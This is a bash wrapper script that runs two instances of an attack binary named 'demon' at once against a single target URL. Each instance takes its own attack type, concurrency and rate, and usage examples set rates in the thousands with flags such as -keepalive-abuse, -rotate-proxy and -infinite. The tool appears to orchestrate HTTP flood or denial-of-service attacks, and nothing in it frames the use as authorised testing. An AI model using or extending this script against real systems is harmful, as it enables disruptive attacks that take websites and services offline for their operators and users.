#!/usr/bin/env bash
# tagteam.sh launches two demon processes against the same target and ensure
# both die cleanly on ctrl+c. running them manually with & orphans the
# background process when you kill the foreground one; this script uses a
# process group so ctrl+c reaches both at once.
#
# usage:
#   ./tagteam.sh <target> <attack1> <concurrency1> <rate1> <attack2> <concurrency2> <rate2> [extra flags...]
#
#    extra flags (anything after the 7 required args) are passed to both processes.
#
# examples:
#   ./tagteam.sh https://example.com 2 300 8000 7 200 4000 -http2 -infinite
#   ./tagteam.sh https://example.com 1 400 1000 9 200 3000 -keepalive-abuse -infinite
#   ./tagteam.sh https://example.com 8 300 3000 2 300 6000 -http2 -rotate-proxy -infinite

set -euo pipefail

if [[ $# -lt 7 ]]; then
    echo "usage: $0 <target> <attack1> <concurrency1> <rate1> <attack2> <concurrency2> <rate2> [extra flags...]"
    echo ""
    echo "  example: $0 https://example.com 2 300 8000 7 200 4000 -http2 -infinite"
    exit 1
fi

TARGET="$1"
ATTACK1="$2"
CONC1="$3"
RATE1="$4"
ATTACK2="$5"
CONC2="$6"
RATE2="$7"
shift 7
EXTRA_FLAGS=("$@") # remaining args go to both processes

BINARY="$(dirname "$0")/demon"
if [[ ! -x "$BINARY" ]]; then
    echo "demon binary not found at $BINARY — run: go build -o demon ."
    exit 1
fi

PUBLIC_IP="$(curl -sf --max-time 4 https://api.ipify.org 2>/dev/null || echo "unknown")"
echo ""
echo "target:    $TARGET"
echo "process 1: attack=$ATTACK1  concurrency=$CONC1  rate=$RATE1"
echo "process 2: attack=$ATTACK2  concurrency=$CONC2  rate=$RATE2"
[[ ${#EXTRA_FLAGS[@]} -gt 0 ]] && echo "shared:    ${EXTRA_FLAGS[*]}"
echo "source ip: $PUBLIC_IP"
echo ""

# put both child processes in their own process group so a single kill signal
# reaches them both. without this, ctrl+c only cancels the foreground wait and
# the backgrounded process keeps running.
PID1=""
PID2=""

cleanup() {
    echo ""
    echo "stopping both processes."
    for pid in "$PID1" "$PID2"; do
        if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
            kill "$pid"
        fi
    done
    wait 2>/dev/null || true
    exit 0
}

trap cleanup SIGINT SIGTERM

echo "launching process 1 (attack $ATTACK1)..."
"$BINARY" \
    -attack "$ATTACK1" \
    -concurrency "$CONC1" \
    -rate "$RATE1" \
    "${EXTRA_FLAGS[@]}" \
    "$TARGET" &
PID1=$!

# small gap so the two processes don't just race on terminal output at startup
sleep 0.5

echo "launching process 2 (attack $ATTACK2)..."
"$BINARY" \
    -attack "$ATTACK2" \
    -concurrency "$CONC2" \
    -rate "$RATE2" \
    "${EXTRA_FLAGS[@]}" \
    "$TARGET" &
PID2=$!

echo "both processes running. press ctrl+c to stop both."
echo ""

# wait for either process to exit. if one dies on its own (error, duration
# reached, etc.) we kill the other so they always stop together.
wait -n "$PID1" "$PID2" 2>/dev/null || true
cleanup
